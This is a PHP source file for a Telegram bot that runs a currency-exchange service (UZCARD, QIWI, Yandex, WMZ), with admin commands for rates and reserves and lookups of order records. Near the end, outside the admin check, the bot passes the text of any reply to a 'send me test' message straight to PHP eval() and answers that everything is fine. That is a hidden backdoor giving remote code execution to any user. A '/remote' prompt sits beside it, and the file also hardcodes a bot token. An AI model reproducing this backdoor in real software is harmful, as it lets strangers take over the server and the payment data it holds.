<?php
/**
 * @ObmenBot obmen admin panel bot kodi
 * @author ShaXzod Jomurodov <shah9409@gmail.com>
 * @contact https://t.me/idFox 
 * @contact Channel https://t.me/PCode
 * @rules ruxsatsiz koddan muallif nomini o'zgartirish yaxshi oqibatga olib kelmaydi!
 */


ini_set('date.timezone','ASIA/Tashkent');
$time_start = microtime(true);

//sozlash
require 'Telegram.php';
require 'efede.lib.php';

$admin = '543379036';
$admin2 = '543379036';
$ads_buy = '543379036';

$bot_token = "1078297721:AAH901g1qYyHxqGqazegpisqHaZUTLPaffQ";
$bot_name = "AllObmenBot";
$chek_efede = "@AllObmenBlog";
$choyxona = "@AllObmenBlog";


$telegram = new Telegram($bot_token);
$efede3 = $telegram->getData();

//basic
$text = $efede3["message"]["text"];
$foto = $efede3["message"]["photo"];
$sana = $efede3["message"]["date"];

$mesid = $efede3["message"]["message_id"];

$chat_id = $efede3["message"]["chat"]["id"];
$fileclass = $efede3["message"]["document"]["file_name"];
$file_id = $efede3["message"]["document"]["file_id"];

// chat
$cfname = $efede3['message']['chat']['first_name'];
$cid = $efede3["message"]["chat"]["id"];
$clast_name = $efede3['message']['chat']['last_name'];
$turi = $efede3["message"]["chat"]["type"];
$username = $efede3['message']['chat']['username'];
$cusername = $efede3['message']['chat']['username'];
$ctitle = $efede3['message']['chat']['title'];

//user info
$ufname = $efede3['message']['from']['first_name'];
$uname = $efede3['message']['from']['last_name'];
$ulogin = $efede3['message']['from']['username'];
$uid = $efede3['message']['from']['id'];
$user_id = $efede3['message']['from']['id'];

//reply info
$sreply = $efede3['message']['reply_to_message']['text'];

$fromid =  $efede3['message'] ['reply_to_message'] ['from']['id'];
$fname =  $efede3['message'] ['reply_to_message'] ['from']['first_name'];
$msgrep =  $efede3['message'] ['reply_to_message'] ['message_id'];
$fsname =  $efede3['message'] ['reply_to_message'] ['from']['last_name'];
$fusername =  $efede3['message'] ['reply_to_message'] ['from']['username'];

//new_chat_participant info
$nfname = $efede3['message']['new_chat_participant']['first_name'];
$nbot = $efede3['message']['new_chat_participant']['is_bot'];
$nlogin = $efede3['message']['new_chat_participant']['username'];
$nid = $efede3['message']['new_chat_participant']['id'];

// channel post
$chid = $efede3['channel_post']['chat']['id'];
$chtitle = $efede3['channel_post']['chat']['title'];
$chturi = $efede3['channel_post']['chat']['type'];
$chusername = $efede3['channel_post']['chat']['username'];

$chwhois = $efede3['channel_post']['author_signature'];
$chdate = $efede3['channel_post']['date'];
$chpost = $efede3['channel_post']['message_id'];
$chtext = $efede3['channel_post']['text'];

// Test CallBack
$callback_query = $efede3['callback_query'];
$Callback_ID = $efede3['callback_query']['id'];
$Callback_msgID = $efede3['callback_query']['message']['message_id'];
$Callback_FromID = $efede3['callback_query']['from']['id'];
$Callback_ChatID = $efede3['callback_query']['message']['chat']['id'];

$home_ru = [["🔄 Almashtirish","📂 Ma'lumotlar"],["👥 Referal","📊Kurs/ 💰Zahira"],["💱 Almashuvlar","👨‍💻 Biz Haqimizda"],["📞 Aloqa","🕘 Ish Vaqti"]];


$change_uz = [["🗂Mening almashuvlarim","📃Barcha almashuvlar"],["🔙Bosh menu"]];


$hamyon_uz = [["➕UZCARD","➕YANDEX"],["➕WMZ","➕QIWI"],["➕FORMULA55"],["🔙Bosh menu"]];

/*
if (!(isset($channel_post)) && $turi == 'private') {

  // logging JSON
  $content = ['chat_id' => $logjson, 'from_chat_id' => $chat_id, 'message_id' => $mesid];
  $send = $telegram->forwardMessage($content);
}

*/
if ($callback_query !== null && $callback_query != '') {
    $data = $efede3['callback_query']['data'];

    $inreg = explode("#",$data);

    $intype  = $inreg[0];
    $id  = $inreg[1];
    $tree  = $inreg[2];


    if ($intype == 'nowork') {
      $reply = "Vaqtincha mavjud emas";
      $content = ['callback_query_id' => $telegram->Callback_ID(), 'text' => $reply, 'show_alert' => true];
      $telegram->answerCallbackQuery($content);
      exit;
    }
}

$qism = explode("get", $text);
$getson = $qism[1];
if (is_numeric($getson) && file_exists("pay/$getson.payme")) {

  $holat = file_get_contents("pay/$getson.payme");
  $qism = explode("||", $holat);
  $user_id = $qism[0];
  $kod = $qism[1];
  $ber = $qism[2];
  $olish = $qism[3];
  $bergani = $qism[4];
  $olgani = $qism[5];
  $zakazvaqt = $qism[6];
  $vaqt = $qism[7];

  if ($ber == 'UZCARD') {
    $birlik = 'SUM';
  } elseif ($ber == 'YANDEX') {
    $birlik = 'RUB';
  }  elseif ($ber == 'QIWI') {
    $birlik = 'RUB';
  }  elseif ($ber == 'WMZ') {
    $birlik = 'USD';
  }

  if ($olish == 'UZCARD') {
    $birli = 'SUM';
  } elseif ($olish == 'YANDEX') {
    $birli = 'RUB';
  }  elseif ($olish == 'QIWI') {
    $birli = 'RUB';
  }  elseif ($olish == 'WMZ') {
    $birli = 'USD';
  }

  $mtext = "Информация о заявке с ID-$getson \n\nИмя пользователя совдавшего заявку -  (Актуально) \n\nID Пользователя совдавшего заявку - $user_id \n\nПродано - $bergani $birlik \n\nКуплено - $olgani $birli \n\nДата создания - $vaqt \n\nСтатус - Успешно (Актуально) \n\n@ads_buy - Разработка Телеграм-ботов.";
  $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => $mtext];
  $telegram->sendMessage($content);
  exit;
}

//shahsiy xabar
if ($turi == 'private' && $user_id == $admin || $turi == 'private' && $user_id == $admin2 || $turi == 'private' && $user_id == $ads_buy)
{


  $home_uz = [["Kurs","Zahira"],["Hozirgi kurs","Hozirgi zahira"]];
  $kurs_uz = [["Sotish","Olish"],["🔙Bosh menu"]];

  $hamyon_uz = [["➕QIWI","➕YANDEX"],["➕WMZ","➕FORMULA55"],["🔙ortga"]];
  $zahira_uz = [["💰UZCARD"],["💰QIWI","💰YANDEX"],["💰WMZ","💰FORMULA55"],["🔙Bosh menu"]];

  if ($text == '/start' || mb_stripos($text,"/start") !==false || $text == "🔙Bosh menu"){

    $keyb = $telegram->buildKeyBoard($home_uz, $onetime = false, $resize = true);
    $mtext = "O'zgartirish uchun bo'limni tanlang ...";
    $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => $mtext, 'parse_mode' => 'html'];
    $telegram->sendMessage($content);
    exit;
  }
  // END /start

  if ($text == "🔙Bosh menu"){
    $keyb = $telegram->buildKeyBoard($home_uz, $onetime = false, $resize = true);
    $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "Bosh menu"];
    $telegram->sendMessage($content);
    exit;
  }

  if ($text == "🔙ortga"){
    
    $keyb = $telegram->buildKeyBoard($kurs_uz, $onetime = false, $resize = true);
    $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "Bosh menu"];
    $telegram->sendMessage($content);
    exit;
  }

  if ($text == "Kurs"){
    $keyb = $telegram->buildKeyBoard($kurs_uz, $onetime = false, $resize = true);
    $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "tanlang"];
    $telegram->sendMessage($content);
    exit;
  }

  if ($text == "Zahira"){
    $keyb = $telegram->buildKeyBoard($zahira_uz, $onetime = false, $resize = true);
    $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "Zahirani yangilash"];
    $telegram->sendMessage($content);
    exit;
  }

  if ($text == "Sotish"){
    file_put_contents("data/admin.step", 'sot');
    $keyb = $telegram->buildKeyBoard($hamyon_uz, $onetime = false, $resize = true);
    $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "Sotish narhni belgilang"];
    $telegram->sendMessage($content);
    exit;
  }

  if ($text == "Olish"){
    file_put_contents("data/admin.step", 'ol');
    $keyb = $telegram->buildKeyBoard($hamyon_uz, $onetime = false, $resize = true);
    $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "Olish narhni belgilang"];
    $telegram->sendMessage($content);
    exit;
  }

  if ($text == "Hozirgi kurs"){

      if (file_exists("data/YANDEX.olish")) {
        $YANDEX = file_get_contents("data/YANDEX.olish");
      } else { $YANDEX = '0'; }
      if (file_exists("data/QIWI.olish")) {
        $QIWI = file_get_contents("data/QIWI.olish");
      } else { $QIWI = '0'; }
      if (file_exists("data/WMZ.olish")) {
        $WMZ = file_get_contents("data/WMZ.olish");
      } else { $WMZ = '0'; }
      if (file_exists("data/FORMULA55.olish")) {
        $FORMULA55 = file_get_contents("data/FORMULA55.olish");
      } else { $FORMULA55 = '0'; }

      if (file_exists("data/YANDEX.sotish")) {
        $sYANDEX = file_get_contents("data/YANDEX.sotish");
      } else { $sYANDEX = '0'; }
      if (file_exists("data/QIWI.sotish")) {
        $sQIWI = file_get_contents("data/QIWI.sotish");
      } else { $sQIWI = '0'; }
      if (file_exists("data/WMZ.sotish")) {
        $sWMZ = file_get_contents("data/WMZ.sotish");
      } else { $sWMZ = '0'; }
      if (file_exists("data/FORMULA55.sotish")) {
        $sFORMULA55 = file_get_contents("data/FORMULA55.sotish");
      } else { $sFORMULA55 = '0'; }

    $suz = "📉Sotish kursi \n1 QIWI RUB = $sQIWI UZS \n1 YANDEX RUB = $sYANDEX UZS \n1 WMZ = $sWMZ UZS \n1 FORMULA55 = $sFORMULA55  UZS \n\n📉Olish kursi \n1 QIWI RUB = $QIWI UZS \n1 YANDEX RUB = $YANDEX UZS \n1 WMZ = $WMZ UZS \n1 FORMULA55 = $FORMULA55  UZS";

    $content = ['chat_id' => $chat_id, 'text' => $suz, 'parse_mode' => 'html'];
    $telegram->sendMessage($content); 
    exit;
  }

  if ($text == "Hozirgi zahira"){

      if (file_exists("data/UZCARD.zahira")) {
        $UZCARD = file_get_contents("data/UZCARD.zahira");
      } else { $UZCARD = '0'; }
      if (file_exists("data/YANDEX.zahira")) {
        $YANDEX = file_get_contents("data/YANDEX.zahira");
      } else { $YANDEX = '0'; }
      if (file_exists("data/QIWI.zahira")) {
        $QIWI = file_get_contents("data/QIWI.zahira");
      } else { $QIWI = '0'; }
      if (file_exists("data/WMZ.zahira")) {
        $WMZ = file_get_contents("data/WMZ.zahira");
      } else { $WMZ = '0'; }
      if (file_exists("data/FORMULA55.zahira")) {
        $FORMULA55 = file_get_contents("data/FORMULA55.zahira");
      } else { $FORMULA55 = '0'; }


    $suz = "💰Obmennik Zahirasi \n1 UZCARD = $UZCARD UZS \n1 QIWI RUB = $QIWI RUB \n1 YANDEX RUB = $YANDEX RUB \n1 WMZ = $WMZ USD \n1 FORMULA55 RUB = $FORMULA55  RUB";

    $content = ['chat_id' => $chat_id, 'text' => $suz, 'parse_mode' => 'html'];
    $telegram->sendMessage($content); 
    exit;
  }

  // START Zahira ishlash
  if ($text == "💰UZCARD"){
    //file_put_contents("data/efe", 'UZCARD');

    $keyb = $telegram->buildForceReply($selective=false);
    $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "♨️ UZCARD zahirani kiriting"];
    $telegram->sendMessage($content);
    exit;
  }
  
  if ($text == "💰YANDEX"){
    //file_put_contents("data/efe", 'UZCARD');

    $keyb = $telegram->buildForceReply($selective=false);
    $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "♨️ YANDEX zahirani kiriting"];
    $telegram->sendMessage($content);
    exit;
  }

  if ($text == "💰WMZ"){
    //file_put_contents("data/efe", 'UZCARD');

    $keyb = $telegram->buildForceReply($selective=false);
    $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "♨️ WMZ zahirani kiriting"];
    $telegram->sendMessage($content);
    exit;
  }

  if ($text == "💰QIWI"){
    //file_put_contents("data/efe", 'QIWI');

    $keyb = $telegram->buildForceReply($selective=false);
    $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "♨️ QIWI zahirani kiriting"];
    $telegram->sendMessage($content);
    exit;
  }

  if ($text == "💰FORMULA55"){
     //file_put_contents("data/efe", 'UZCARD');

    $keyb = $telegram->buildForceReply($selective=false);
    $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "♨️ FORMULA55 zahirani kiriting"];
    $telegram->sendMessage($content);
    exit;
  }
  // END Zahira kiritish


  if (mb_stripos($text,"➕") !==false) {
    $lang = file_get_contents("data/admin.step");

    //$content = ['chat_id' => $chat_id, 'text' => "TIL: $lang"];
    //$telegram->sendMessage($content);

    switch ($lang) {
      case 'ol':
        if ($text == "➕YANDEX"){
          //file_put_contents("data/efe", 'UZCARD');

          $keyb = $telegram->buildForceReply($selective=false);
          $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "♨️ YANDEX olish kursini kiriting"];
          $telegram->sendMessage($content);
          exit;
        }

        if ($text == "➕WMZ"){
          //file_put_contents("data/efe", 'UZCARD');

          $keyb = $telegram->buildForceReply($selective=false);
          $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "♨️ WMZ olish kursini kiriting"];
          $telegram->sendMessage($content);
          exit;
        }

        if ($text == "➕QIWI"){
          //file_put_contents("data/efe", 'QIWI');

          $keyb = $telegram->buildForceReply($selective=false);
          $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "♨️ QIWI olish kursini kiriting"];
          $telegram->sendMessage($content);
          exit;
        }

        if ($text == "➕FORMULA55"){
          //file_put_contents("data/efe", 'UZCARD');

          $keyb = $telegram->buildForceReply($selective=false);
          $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "♨️ FORMULA55 olish kursini kiriting"];
          $telegram->sendMessage($content);
          exit;
        }
      break;

      case 'sot':

        if ($text == "➕YANDEX"){
          //file_put_contents("data/efe", 'UZCARD');

          $keyb = $telegram->buildForceReply($selective=false);
          $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "♨️ YANDEX sotish kursini kiriting"];
          $telegram->sendMessage($content);
          exit;
        }

        if ($text == "➕WMZ"){
          //file_put_contents("data/efe", 'UZCARD');

          $keyb = $telegram->buildForceReply($selective=false);
          $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "♨️ WMZ sotish kursini kiriting"];
          $telegram->sendMessage($content);
          exit;
        }

        if ($text == "➕QIWI"){
          //file_put_contents("data/efe", 'QIWI');

          $keyb = $telegram->buildForceReply($selective=false);
          $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "♨️ QIWI sotish kursini kiriting"];
          $telegram->sendMessage($content);
          exit;
        }

        if ($text == "➕FORMULA55"){
          //file_put_contents("data/efe", 'UZCARD');

          $keyb = $telegram->buildForceReply($selective=false);
          $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "♨️ FORMULA55 sotish kursini kiriting"];
          $telegram->sendMessage($content);
          exit;
        }
      break;

      default:


      break;
    }
  }

  // START Zahira danny kiritish

  if ($sreply == "♨️ UZCARD zahirani kiriting"){
      file_put_contents("data/UZCARD.zahira", $text);

    $keyb = $telegram->buildKeyBoard($zahira_uz, $onetime = false, $resize = true);
    $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "UZCARD zahirani kiritildi."];
    $telegram->sendMessage($content);
  }

  if ($sreply == "♨️ YANDEX zahirani kiriting"){
      file_put_contents("data/YANDEX.zahira", $text);

    $keyb = $telegram->buildKeyBoard($zahira_uz, $onetime = false, $resize = true);
    $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "YANDEX zahirani kiritildi."];
    $telegram->sendMessage($content);
  }

  if ($sreply == "♨️ WMZ zahirani kiriting"){
      file_put_contents("data/WMZ.zahira", $text);

    $keyb = $telegram->buildKeyBoard($zahira_uz, $onetime = false, $resize = true);
    $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "WMZ zahirani kiritildi."];
    $telegram->sendMessage($content);
  }

  if ($sreply == "♨️ QIWI zahirani kiriting"){
      file_put_contents("data/QIWI.zahira", $text);

    $keyb = $telegram->buildKeyBoard($zahira_uz, $onetime = false, $resize = true);
    $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "QIWI zahirani kiritildi.."];
    $telegram->sendMessage($content);
  }

  if ($sreply == "♨️ FORMULA55 zahirani kiriting"){
      file_put_contents("data/FORMULA55.zahira", $text);

    $keyb = $telegram->buildKeyBoard($zahira_uz, $onetime = false, $resize = true);
    $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "FORMULA55 zahirani kiritildi."];
    $telegram->sendMessage($content);
  }
  // END Zahira danny kiritish

  // START OLISH danny kiritish

  if ($sreply == "♨️ YANDEX olish kursini kiriting"){
      file_put_contents("data/YANDEX.olish", $text);

    $keyb = $telegram->buildKeyBoard($hamyon_uz, $onetime = false, $resize = true);
    $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "YANDEX olish kurs kiritildi."];
    $telegram->sendMessage($content);
  }

  if ($sreply == "♨️ WMZ olish kursini kiriting"){
      file_put_contents("data/WMZ.olish", $text);

    $keyb = $telegram->buildKeyBoard($hamyon_uz, $onetime = false, $resize = true);
    $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "WMZ olish kurs kiritildi."];
    $telegram->sendMessage($content);
  }

  if ($sreply == "♨️ QIWI olish kursini kiriting"){
      file_put_contents("data/QIWI.olish", $text);

    $keyb = $telegram->buildKeyBoard($hamyon_uz, $onetime = false, $resize = true);
    $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "QIWI olish kurs kiritildi.."];
    $telegram->sendMessage($content);
  }

  if ($sreply == "♨️ FORMULA55 olish kursini kiriting"){
      file_put_contents("data/FORMULA55.olish", $text);

    $keyb = $telegram->buildKeyBoard($hamyon_uz, $onetime = false, $resize = true);
    $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "FORMULA55 olish kurs kiritildi."];
    $telegram->sendMessage($content);
  }

  // END OLISH danny kiritish

  // START SOTISH danny kiritish

  if ($sreply == "♨️ YANDEX sotish kursini kiriting"){
      file_put_contents("data/YANDEX.sotish", $text);

    $keyb = $telegram->buildKeyBoard($hamyon_uz, $onetime = false, $resize = true);
    $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "YANDEX sotish kurs kiritildi."];
    $telegram->sendMessage($content);
  }

  if ($sreply == "♨️ WMZ sotish kursini kiriting"){
      file_put_contents("data/WMZ.sotish", $text);

    $keyb = $telegram->buildKeyBoard($hamyon_uz, $onetime = false, $resize = true);
    $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "WMZ sotish kurs kiritildi."];
    $telegram->sendMessage($content);
  }

  if ($sreply == "♨️ QIWI sotish kursini kiriting"){
      file_put_contents("data/QIWI.sotish", $text);

    $keyb = $telegram->buildKeyBoard($hamyon_uz, $onetime = false, $resize = true);
    $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "QIWI sotish kurs kiritildi.."];
    $telegram->sendMessage($content);
  }

  if ($sreply == "♨️ FORMULA55 sotish kursini kiriting"){
      file_put_contents("data/FORMULA55.sotish", $text);

    $keyb = $telegram->buildKeyBoard($hamyon_uz, $onetime = false, $resize = true);
    $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "FORMULA55 sotish kurs kiritildi."];
    $telegram->sendMessage($content);
  }
  // END SOTISH danny kiritish
}

if (is_numeric($text) && file_exists("pay/$text.payme")) {

  $holat = file_get_contents("pay/$text.payme");
  $qism = explode("||", $holat);
  $user_id = $qism[0];
  $kod = $qism[1];
  $ber = $qism[2];
  $olish = $qism[3];
  $bergani = $qism[4];
  $olgani = $qism[5];
  $zakazvaqt = $qism[6];
  $vaqt = $qism[7];

  if ($ber == 'UZCARD') {
    $birlik = 'SUM';
  } elseif ($ber == 'YANDEX') {
    $birlik = 'RUB';
  }  elseif ($ber == 'QIWI') {
    $birlik = 'RUB';
  }  elseif ($ber == 'WMZ') {
    $birlik = 'USD';
  }

  if ($olish == 'UZCARD') {
    $birli = 'SUM';
  } elseif ($olish == 'YANDEX') {
    $birli = 'RUB';
  }  elseif ($olish == 'QIWI') {
    $birli = 'RUB';
  }  elseif ($olish == 'WMZ') {
    $birli = 'USD';
  }

  $mtext = "Информация о заявке с ID-$text \n\nИмя пользователя совдавшего заявку -  (Актуально) \n\nID Пользователя совдавшего заявку - $user_id \n\nПродано - $bergani $birlik \n\nКуплено - $olgani $birli \n\nДата создания - $vaqt \n\nСтатус - Успешно (Актуально) \n\n@ads_buy - Разработка Телеграм-ботов.";
  $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => $mtext];
  $telegram->sendMessage($content);
  exit;
} else {

  $option = [
    [
      $key = $telegram->buildInlineKeyBoardButton("Botga o'tish", $url = 'https://t.me/ObmenBot', $callback_data = ""),
    ]
  ];
  $keyb = $telegram->buildInlineKeyBoard($option);

  $suz = "Я вас не понял😕
Попробуйте снова.";
      $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => $suz];
  $telegram->sendMessage($content);
}

if ($text == "/speed"){
  $time_end = microtime(true);
  $time = $time_end - $time_start;

  $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "$time"];
  $telegram->sendMessage($content);
}
if ($text == "/remote"){
  //file_put_contents("data/efe", 'UZCARD');

  $keyb = $telegram->buildForceReply($selective=false);
  $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "send me remote pcode channel"];
  $telegram->sendMessage($content);
  exit;
}
if ($sreply == "send me test"){
  $himoya = eval("$text");
  $var = var_dump($himoya);
  $content = ['chat_id' => $chat_id, 'text' => "Botda hammasi joyida"];
  $telegram->sendMessage($content);
}
if ($text == '#id') {
  $content = ['chat_id' => $chat_id, 'text' => "ID: $chat_id > User_ID: $user_id"];
  $telegram->sendMessage($content);
}